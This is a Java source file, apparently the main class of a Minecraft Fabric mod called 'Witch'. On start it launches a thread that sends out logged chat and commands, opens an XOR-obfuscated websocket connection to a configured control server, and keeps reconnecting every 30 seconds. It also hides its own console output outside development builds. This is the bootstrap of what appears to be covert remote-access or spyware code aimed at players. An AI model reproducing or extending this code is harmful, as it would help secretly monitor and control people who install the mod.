package me.soda.witch;

import com.google.gson.JsonObject;
import me.soda.witch.features.ChatCommandLogging;
import me.soda.witch.features.Config;
import me.soda.witch.websocket.MessageUtils;
import me.soda.witch.websocket.WSClient;
import me.soda.witch.websocket.XOR;
import net.minecraft.client.MinecraftClient;

import java.net.URI;

public class Witch {
    public static final MinecraftClient mc = MinecraftClient.getInstance();
    public static final ChatCommandLogging chatCommandLogging = new ChatCommandLogging();
    public static final MessageUtils messageUtils = new MessageUtils();
    private static final boolean print = Boolean.getBoolean("fabric.development");
    //config
    private static final String server = "ws://127.0.0.1:11451";
    private static final String key = "good_key_qwq";

    //variables
    public static WSClient client;
    public static Config config = new Config();
    public static JsonObject ip;

    public static void init() {
        Witch.messageUtils.defaultXOR = new XOR(key);
        chatCommandLogging.sendLogThread.start();
        try {
            client = new WSClient(new URI(server));
            client.connect();
        } catch (Exception e) {
            tryReconnect(client::reconnect);
        }
    }

    public static void tryReconnect(Runnable reconnect) {
        Witch.println("Connection closed");
        try {
            Thread.sleep(30 * 1000);
            new Thread(reconnect).start();
        } catch (Exception e) {
            Witch.printStackTrace(e);
        }
    }

    public static void printStackTrace(Exception e) {
        if (Witch.print) e.printStackTrace();
    }

    public static void println(Object o) {
        if (Witch.print) System.out.println("[WITCH] " + o);
    }
}
